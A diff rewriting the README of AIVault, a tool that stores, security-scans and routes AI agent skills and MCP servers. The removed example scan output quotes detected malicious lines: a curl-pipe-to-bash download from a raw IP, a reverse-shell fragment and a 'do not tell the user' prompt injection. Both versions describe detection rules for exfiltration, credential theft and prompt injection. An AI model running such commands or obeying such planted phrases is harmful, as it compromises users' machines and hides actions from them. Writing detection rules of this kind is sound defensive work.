@@ -1,36 +1,30 @@
 <p align="center">
-  <img src="assets/banner.svg" alt="AIVault — one library and router for every AI skill, connector and tool" width="100%">
+  <img src="assets/banner.svg" alt="AIVault" width="100%">
 </p>
 
 <p align="center">
   <a href="https://github.com/Mohammed-051/AIVault/actions/workflows/ci.yml"><img alt="CI" src="https://github.com/Mohammed-051/AIVault/actions/workflows/ci.yml/badge.svg"></a>
-  <img alt="Zero dependencies" src="https://img.shields.io/badge/dependencies-0-brightgreen">
-  <img alt="Node 18+" src="https://img.shields.io/badge/node-%E2%89%A518-339933?logo=nodedotjs&logoColor=white">
-  <img alt="Windows · macOS · Linux" src="https://img.shields.io/badge/platform-Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-blue">
-  <img alt="MCP" src="https://img.shields.io/badge/MCP-server-5c4ee5">
-  <a href="LICENSE"><img alt="MIT" src="https://img.shields.io/badge/license-MIT-f4c430"></a>
+  <a href="LICENSE"><img alt="License: MIT" src="https://img.shields.io/badge/license-MIT-blue"></a>
+  <img alt="Node.js 18+" src="https://img.shields.io/badge/node-%E2%89%A518-339933">
+  <img alt="Dependencies: 0" src="https://img.shields.io/badge/dependencies-0-success">
 </p>
 
-<p align="center">
-  <b>Paste a repo link. AIVault security-scans it, files it, sorts every skill into a domain,<br>
-  and routes each task to the 1–3 skills it actually needs — for code, writing, content, media, research and more.</b>
-</p>
+**AIVault** is a local library and router for agent skills, MCP servers and AI tooling.
 
----
+You add a source by its repository URL. AIVault clones it into quarantine, scans it for malicious content, files it by type, classifies every skill it contains, and keeps a compact index. Agents use that index to load only the one to three skills a task needs.
 
-```text
-> vault https://github.com/coreyhaines31/marketingskills
+It works with any agent that can read files or connect to an MCP server: Claude Desktop, Claude Code, Cursor, Windsurf, VS Code Copilot and others. It runs on Windows, macOS and Linux with Node.js 18+ and git, and has no other dependencies.
 
+```console
+$ vault add https://github.com/coreyhaines31/marketingskills
 Cloning https://github.com/coreyhaines31/marketingskills.git…
 Security ✓ CLEAN — marketingskills: 0 critical · 0 high · 0 medium · 3 low (815 files)
 Added "marketingskills" → library/skills/marketingskills (skills)
   Skills: 53
   Domains: Content & marketing 39 · Business, legal & finance 4 · Software engineering 3 · …
-  Also a Claude Code plugin: /plugin marketplace add coreyhaines31/marketingskills
 Indexed 1074 skills · dashboard ≈ 1783 tokens.
 
-> vault route "write a launch post for AgriSphere"
-
+$ vault route "write a launch post for AgriSphere"
 Project memory: memory/agrisphere.md
 Base skills (Writing, content, media, design, documents): library/skills/caveman-claude-skill/SKILL.md
 Candidate skills (pick at most 2, open the path):
@@ -38,189 +32,188 @@ Candidate skills (pick at most 2, open the path):
   library/skills/marketingskills/skills/launch/SKILL.md
 ```
 
-```text
-> vault add ./suspicious-skill
+## Contents
 
-Security ⛔ BLOCKED — suspicious-skill: 5 critical · 6 high · 2 medium · 0 low (4 files)
-  [critical] RCE-PIPE-SHELL — Downloads code and pipes it straight into a shell/interpreter
-           SKILL.md:9  “curl -s http://203.0.113.7/install.sh | bash”
-  [critical] RCE-REVERSE-SHELL — Reverse shell / remote backdoor
-           scripts/sync.py:4  “bash -i >& /dev”
-  [high] PI-HIDE-FROM-USER — Tells the agent to hide actions from the user
-           SKILL.md:13  “do not tell the user”
-  …
-⛔ Not added. Full report: .vault/security/suspicious-skill.md
-```
+- [Installation](#installation)
+- [Usage](#usage)
+- [How it works](#how-it-works)
+- [Security model](#security-model)
+- [Performance](#performance)
+- [MCP server](#mcp-server)
+- [Comparison](#comparison)
+- [Documentation](#documentation)
 
-## Why
-
-Skills, MCP servers and agent tooling are multiplying fast. A typical power-user setup has hundreds of skills across a dozen repos, and three problems:
-
-1. **Context.** You can't load 1,000 skills into a chat. Agents need to find the right two.
-2. **Chaos.** Clones end up in random folders, with duplicates and no record of what you have or where it came from.
-3. **Safety.** [Snyk found 76 confirmed malicious skills, and 13% with critical issues](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/), in a public registry. The tricks included `curl | bash`, base64 payloads, credential theft and prompt injection.
-
-AIVault fixes all three with one folder and one MCP server.
-
-## Features
-
-| | |
-|---|---|
-| 🔗 **Paste-a-link install** | `owner/repo`, any GitHub or git URL, a single folder (`…/tree/main/skills/pdf`) or a local path. In chat, just paste the link. |
-| 🛡️ **Security gate** | Every repo is scanned in quarantine with 36 context-aware rules for malware, backdoors, exfiltration, prompt injection, obfuscation and leaked keys. Blocked repos never reach your library. Updates are re-scanned and rolled back if they turn bad. Runs [NVIDIA SkillSpector](https://github.com/NVIDIA/skillspector) or [Cisco skill-scanner](https://github.com/cisco-ai-defense/skill-scanner) too, if installed. |
-| 🗂️ **Auto-filing** | Detects whether a repo is skills, an MCP server, a plugin, a tool or an awesome-list, and files it under `library/<kind>/`. |
-| 🧭 **Token-budgeted router** | A ~1.7k-token `dashboard.md`, plus one small index per domain. Measured on a real 1,020-skill vault: largest index ~2.4k tokens. 832 near-identical automation skills collapse into **one line**. |
-| 🎯 **`vault_route`** | One MCP call returns exactly what to load (project memory, base skills, pinned routes, best matches) in about 300 tokens. |
-| 🌍 **Every kind of work** | 19 domains: engineering, frontend, backend, C++/graphics, embedded, mobile, data/ML, DevOps/security, design, writing, marketing, media, office docs, research, productivity, business, learning, integrations, agent tooling. |
-| 🧠 **Project memory** | `memory/<project>.md`: agents read it before work and log one line after. No more re-explaining your project. |
-| ⚡ **One-step setup** | `setup.cmd` / `setup.sh` connects Claude Desktop (including the Microsoft Store version), Claude Code, Cursor, Windsurf and VS Code. It backs up every config and closes/reopens Claude for you. |
-| 📦 **Starter packs** | 11 curated packs (writing, marketing, media, documents, research, dev…), plus `vault export` to share your own setup. |
-| 🪶 **Zero dependencies** | Node 18+ and git. No `npm install`. Works on Windows, macOS and Linux. |
-
-## Quick start
+## Installation
 
 ```bash
 git clone https://github.com/Mohammed-051/AIVault.git
 cd AIVault
 ```
 
-- **Windows:** double-click `setup.cmd`.
-- **macOS / Linux:** run `sh setup.sh`.
+| Platform | Command |
+|---|---|
+| Windows | double-click `setup.cmd`, or run `.\setup.cmd` |
+| macOS / Linux | `sh setup.sh` |
 
-The wizard:
+The setup wizard:
 
-1. Checks Node and git.
-2. Offers starter packs.
-3. Finds your AI apps and connects them.
-4. Puts `vault` on your PATH.
-5. Copies the one-paragraph agent instruction to your clipboard.
+- Checks for Node.js and git.
+- Offers optional starter packs.
+- Registers the MCP server with every supported client it finds: Claude Desktop (including the Microsoft Store build), Claude Code, Cursor, Windsurf and VS Code. Each config file is backed up before it's modified.
+- Adds `vault` to your `PATH`.
+- Copies a one-paragraph agent instruction to the clipboard.
 
-Paste that into a Claude Project's instructions, and you're done.
+Claude Desktop is closed and reopened automatically when its configuration changes. To run the setup again later, or for one client only, use `vault setup` or `vault connect --client <id>`.
 
-Then try asking:
+## Usage
 
-> *"Add https://github.com/blader/humanizer to my vault."*
-> *"What does vault_route say for: edit my thesis chapter to sound less robotic?"*
+| Command | Description |
+|---|---|
+| `vault add <source>` | Add a source. Accepts `owner/repo`, a GitHub URL (including `/tree/<ref>/<dir>` for a single folder), any git URL, or a local directory |
+| `vault add <source> --dry-run` | Scan and classify without adding |
+| `vault add <source> --only a,b` | Keep only the named skills |
+| `vault scan [name \| all \| url]` | Security-scan installed sources, or preview a repository |
+| `vault route "<task>"` | Show what an agent would load for a task |
+| `vault search <terms>` | Search all skills |
+| `vault update [name]` | Fetch the latest versions; re-scan; roll back an update that fails |
+| `vault new-project "<name>" --type <kind>` | Create a project memory file |
+| `vault new-skill <name>` | Scaffold a skill in `local/skills/` |
+| `vault link <skill>` | Expose a skill to Claude Code's native loader |
+| `vault pack [name]` · `vault export [name]` | Install or share a list of sources |
+| `vault doctor` | Check paths, pins, security status and token budgets |
+
+With the MCP server connected, the same operations are available from chat. Pasting a repository link and asking the agent to add it runs `vault_add`.
 
 ## How it works
 
 ```text
-            ┌─────────────── vault add <link> ───────────────┐
-            │  clone → quarantine → security scan → classify │
-            └───────────────┬────────────────────────────────┘
-                            ▼
- library/skills · mcp · plugins · tools · catalogs      (your sources, git-ignored)
-                            │  scan SKILL.md · dedupe · families · 19 domains
-                            ▼
- dashboard.md (~1.7k tok) ─► index/<domain>.md (0.1–2.5k tok) ─► 1–3 × SKILL.md
-          ▲                                                      ▲
-          └──────────── vault_route("task")  ≈ 300 tokens ───────┘
+source URL ─► quarantine clone ─► security scan ─► classify ─► library/<kind>/<name>
+                                       │ blocked                      │
+                                       ▼                              ▼
+                                   discarded               catalog (.vault/catalog.json)
+                                                                      │
+                     dashboard.md  ◄──────────────  index/<domain>.md ◄┘
+                          ▲                               ▲
+     agent ── vault_route(task) ── returns 1–3 SKILL.md paths + project memory
 ```
 
-More detail in [docs/architecture.md](docs/architecture.md).
+### Design decisions
 
-## Security
+**Progressive disclosure.** Agents never read the library directly. They read two things:
+- `dashboard.md`, about 1.7k tokens: protocol, pinned routes, domain map and projects.
+- One `index/<domain>.md`, or a single `vault_route` call.
 
-| Verdict | When | Result |
-|---|---|---|
-| ✓ clean | nothing notable | added |
-| · caution | medium findings only | added |
-| ⚠ review | any high finding | added, but flagged ⚠ everywhere agents see it; `vault_read` prepends a warning |
-| ⛔ blocked | any critical finding | **not added.** Only a human can override, from a terminal (`--allow-risky`) |
+Only the selected `SKILL.md` files are loaded in full.
 
-The scanner reads context, so legitimate repos aren't drowned in false positives:
+**Classification.** Each skill is scored against 19 domains using its name, path and description, and is placed in at most two. The domains span engineering, frontend, backend, systems, embedded, mobile, data/ML, DevOps/security, design, writing, marketing, media, office documents, research, productivity, business, learning, integrations and agent tooling. The taxonomy is plain data in `engine/lib/domains.mjs`.
 
-- **Where text appears matters.** A `SKILL.md` an agent follows is held to a stricter standard than a README or a test fixture.
-- **`curl | sh` is graded by URL.** An official installer such as uv or rustup passes; a raw IP is blocked.
-- **Quoted examples are allowed.** A prompt-security skill quoting *"ignore previous instructions"* is fine.
+**Index hygiene.**
+- **Duplicates.** Identical or same-named skills from different sources are shown once, preferring local, then official, then community sources.
+- **Families.** Large sets of near-identical skills, such as 832 `<app>-automation` skills, collapse to a single line and stay reachable through search.
+- **Maintainer-only skills.** Skills an MCP-server repository keeps for its own developers are excluded unless you ask for them.
 
-**Calibration:** none of 24 popular repos is blocked (Anthropic skills, Superpowers, everything-claude-code, the official MCP servers and others). A fixture reproducing the published ClawHub attacks is blocked with 5 critical findings.
+**Routing.** `vault_route` combines four things:
+1. Project memory, when the task names a project.
+2. Base skills per task type, for example a terse-output skill for code.
+3. Keyword-pinned routes.
+4. A BM25 search with stemming and synonym expansion. Weak single-word matches are discarded.
 
-Rules, limits and calibration details: [docs/security.md](docs/security.md).
+**Kind detection.** Repositories are filed as `skills`, `mcp`, `plugins`, `tools` or `catalogs`, based on their contents:
+- `SKILL.md` files.
+- MCP signals: the MCP SDK as a dependency, `mcpName`, `server.json` or `fastmcp`.
+- Plugin manifests.
+- Link density, for awesome-lists.
 
-## Commands
+## Security model
 
-| | |
+Public skill registries have been used to distribute malware. Snyk's 2026 review of 3,984 skills found 76 confirmed malicious payloads, with 13.4% of skills carrying at least one critical issue ([ToxicSkills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)). AIVault treats every source as untrusted:
+
+- **Quarantine first.** Sources are cloned to `.vault/tmp/` and scanned before anything reaches `library/`. AIVault never executes code from a source.
+- **36 static rules** cover:
+  - remote code execution (`curl … | sh`, encoded PowerShell, base64-to-shell);
+  - reverse shells, credential-store access, exfiltration endpoints;
+  - prompt injection, including invisible Unicode and hidden HTML comments;
+  - persistence mechanisms, disabled security controls, disguised binaries;
+  - password-protected archives, npm install hooks and hard-coded keys.
+- **Context-aware severity.** The same text is scored differently depending on where it appears:
+  - full strength in instruction files an agent follows, and in scripts those files invoke;
+  - reduced in human-facing documentation;
+  - test and documentation directories are skipped unless an instruction file references them;
+  - `curl | sh` is graded by URL: vendor installer low, unknown HTTPS domain medium, HTTP or raw IP critical.
+- **Verdicts.**
+
+  | Verdict | Condition | Effect |
+  |---|---|---|
+  | `clean` | no findings above low | added |
+  | `caution` | medium findings only | added |
+  | `review` | any high finding | added; skills marked ⚠ in every index; `vault_read` prepends a warning |
+  | `blocked` | any critical finding | not added; override only from the CLI with `--allow-risky` |
+
+- **Updates** are re-scanned, and rolled back automatically if the new version is blocked.
+- **External scanners.** [NVIDIA SkillSpector](https://github.com/NVIDIA/skillspector) and [Cisco skill-scanner](https://github.com/cisco-ai-defense/skill-scanner) run automatically when installed, and their verdicts are merged.
+- **The MCP server cannot override a block,** and `vault_read` cannot read outside the vault or inside `.git`.
+
+**Calibration:**
+- **24 popular repositories:** none are blocked, and one is flagged for review. They include Anthropic skills, Superpowers, everything-claude-code, the official MCP servers, GitHub MCP and Composio.
+- **Test fixture** reproducing the published attack techniques: blocked with 5 critical and 6 high findings.
+
+The full rule list and known limitations are in [docs/security.md](docs/security.md).
+
+## Performance
+
+Measured on a real vault with 17 sources and 1,020 skills:
+
+| Metric | Value |
 |---|---|
-| `vault setup` | First-run wizard (`--yes` for defaults) |
-| `vault <link>` / `vault add <link>` | Add a source. Flags: `--dry-run`, `--only a,b`, `--kind`, `--domain`, `--name`, `--allow-risky` |
-| `vault scan [name\|all\|url]` | Security-scan sources, or preview a repo without adding it |
-| `vault route "<task>"` | See what an agent would load |
-| `vault search <words>` | Find skills |
-| `vault update [name]` | Pull latest, re-scan, roll back bad updates |
-| `vault list [kind\|domain]` | Browse |
-| `vault new-project "<name>" --type writing` | Create project memory |
-| `vault new-skill <name>` | Scaffold your own skill in `local/skills/` |
-| `vault link <skill>` | Use a skill natively in Claude Code (`~/.claude/skills`) |
-| `vault pack [name]` · `vault export [name]` | Install or share source lists |
-| `vault connect` · `vault mcp-config` | (Re)connect apps, or print config for others |
-| `vault doctor` | Health check |
-| `vault migrate` | Adopt loose git clones already in the folder |
+| `dashboard.md` | ≈ 1,700 tokens |
+| Largest domain index | ≈ 2,400 tokens |
+| `vault_route` response | ≈ 300 tokens |
+| Security scan, 17 sources (≈ 16,000 files) | 6.3 s |
+| Re-index | < 1 s |
 
-## Starter packs
+## MCP server
 
-| Pack | Contents |
+`engine/mcp.mjs` implements the MCP stdio transport without an SDK. A single server provides:
+
+| Tool | Purpose |
 |---|---|
-| `essentials` | caveman (terse replies), ponytail (minimal code), Matt Pocock's skills, Superpowers, Anthropic's official skills |
-| `dev` | 60+ language/framework specialists, debugging, review, TDD, codebase graphs |
-| `frontend-design` | Anthropic frontend-design, UI/UX Pro Max, design audits |
-| `writing` | humanizer, document co-authoring, Obsidian |
-| `content-marketing` | 50+ marketing skills: SEO, CRO, copy, launches, email |
-| `media` | Remotion video, cut-video |
-| `documents` | Word, PDF, PowerPoint, Excel |
-| `research` | 100+ scientific skills |
-| `connectors` | Official MCP servers, GitHub MCP, community MCP list |
-| `workflow` | GSD, Context Mode, Tamp |
-| `integrations` | 800+ SaaS automations (Composio) |
+| `vault_route` | Files to load for a task: project memory, base skills, pinned routes, best matches |
+| `vault_read` | Read a vault file by path (sandboxed, read-only) |
+| `vault_memory` | List, read, or append to project memory |
+| `vault_search`, `vault_list` | Discover skills and sources |
+| `vault_add`, `vault_scan`, `vault_update`, `vault_remove` | Manage sources, all with security scanning |
+| `vault_new_project`, `vault_doctor` | Project setup and health checks |
 
-## How it compares
+For clients that setup doesn't detect, print the configuration with `vault mcp-config`.
 
-| | Install skills | Search | All kinds of work | MCP / tools / catalogs | Security scan | Project memory | One-step app setup |
+## Comparison
+
+| | Installs skills | Search | Non-code domains | MCP servers, tools, catalogs | Security scanning | Project memory | Client setup |
 |---|---|---|---|---|---|---|---|
-| [`gh skill`](https://github.blog/changelog/2026-04-17-manage-agent-skills-with-github-cli/) | ✓ (pin, update) | ✓ | — | — | — (preview only) | — | — |
-| [OpenSkills](https://github.com/numman-ali/openskills) | ✓ | — | code | — | — | — | — |
-| [Vercel `skills`](https://github.com/vercel-labs/skills) | ✓ | ✓ | code | — | — | — | — |
-| [claude-skills-mcp](https://github.com/K-Dense-AI/claude-skills-mcp) | — | ✓ embeddings | ✓ | — | — | — | — |
-| [SkillSpector](https://github.com/NVIDIA/skillspector) / [skill-scanner](https://github.com/cisco-ai-defense/skill-scanner) | — | — | — | — | ✓ (deep, Python) | — | — |
-| **AIVault** | ✓ (+ `vault link`) | ✓ BM25, offline | ✓ 19 domains | ✓ | ✓ built-in, + those two if present | ✓ | ✓ 5 apps |
+| [`gh skill`](https://github.blog/changelog/2026-04-17-manage-agent-skills-with-github-cli/) | yes, with pinning | yes | — | — | preview only | — | — |
+| [OpenSkills](https://github.com/numman-ali/openskills) | yes | — | — | — | — | — | — |
+| [Vercel `skills`](https://github.com/vercel-labs/skills) | yes | yes | — | — | — | — | — |
+| [claude-skills-mcp](https://github.com/K-Dense-AI/claude-skills-mcp) | — | embeddings | yes | — | — | — | — |
+| [SkillSpector](https://github.com/NVIDIA/skillspector), [skill-scanner](https://github.com/cisco-ai-defense/skill-scanner) | — | — | — | — | deep (Python) | — | — |
+| **AIVault** | yes, plus `vault link` | BM25, offline | 19 domains | yes | built in; uses the above when present | yes | 5 clients |
 
-They work well together. AIVault uses SkillSpector or skill-scanner automatically when they're installed, and `vault link` hands a skill to Claude Code's native loader.
+## Documentation
 
-## FAQ
+| Document | Contents |
+|---|---|
+| [docs/architecture.md](docs/architecture.md) | Directory layout, add pipeline, indexing and routing internals |
+| [docs/security.md](docs/security.md) | Threat model, all rules, severity adjustments, calibration, limitations |
+| [docs/configuration.md](docs/configuration.md) | `vault.json`: profiles, pinned routes, overrides, source defaults, security policy |
+| [docs/mcp-tools.md](docs/mcp-tools.md) | MCP tools, supported clients, recommended agent instructions |
 
-**Does it run anything from the repos I add?**
-No. It clones and reads files. Tools that need installing are listed in `index/tools.md` for you to install yourself.
-
-**Will it bloat my context?**
-No. Agents read the ~1.7k-token dashboard, or call `vault_route` (~300 tokens), then open 1–3 skill files.
-
-**Do I need Claude?**
-No. Any agent that can read files or speak MCP works: Claude Desktop/Code, Cursor, Windsurf, VS Code Copilot, Codex and others.
-
-**Can I keep my library private and still share my setup?**
-Yes. `library/`, `memory/` and `vault.json` are git-ignored. `vault export my-setup` writes a pack anyone can install.
-
-**What's a "skill family"?**
-A naming pattern with 15+ skills in one source (e.g. Composio's `<app>-automation`). It's shown as one line. `vault_route` still finds the specific member when you name the app.
-
-## Roadmap
-
-- [ ] Optional embeddings search (local, opt-in)
-- [ ] `vault pin <source>@<sha>` and signed packs
-- [ ] Web dashboard (`vault serve`)
-- [ ] Community pack registry
-- [ ] More scanner rules: MCP tool-description poisoning, dependency CVEs (OSV)
+Starter packs live in [`packs/`](packs). There are 11, covering essentials, development, frontend design, writing, marketing, media, office documents, research, connectors, workflow and integrations.
 
 ## Contributing
 
-PRs welcome, especially new packs, domain keywords, scanner rules (with a malicious sample *and* a benign look-alike) and false-positive reports. See [CONTRIBUTING.md](CONTRIBUTING.md). Security issues: [SECURITY.md](SECURITY.md).
-
-## Acknowledgements
-
-The scanner rules draw on research by [Snyk (ToxicSkills)](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/), [arXiv 2605.28588](https://arxiv.org/html/2605.28588), [NVIDIA SkillSpector](https://github.com/NVIDIA/skillspector) and [Cisco AI Defense](https://github.com/cisco-ai-defense/skill-scanner).
-
-Progressive disclosure ideas come from [Anthropic's Agent Skills](https://github.com/anthropics/skills), [OpenSkills](https://github.com/numman-ali/openskills) and [claude-skills-mcp](https://github.com/K-Dense-AI/claude-skills-mcp).
+Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md). Scanner rules must come with two tests: a malicious sample and a benign look-alike. To report a vulnerability, follow [SECURITY.md](SECURITY.md) rather than opening a public issue.
 
 ## License
 
-[MIT](LICENSE). Skills you add keep their own licenses.
+[MIT](LICENSE). Skills and servers added to a vault remain under their own licenses.
+
+The scanner rules draw on research by [Snyk](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/), [arXiv 2605.28588](https://arxiv.org/html/2605.28588), [NVIDIA](https://github.com/NVIDIA/skillspector) and [Cisco AI Defense](https://github.com/cisco-ai-defense/skill-scanner).
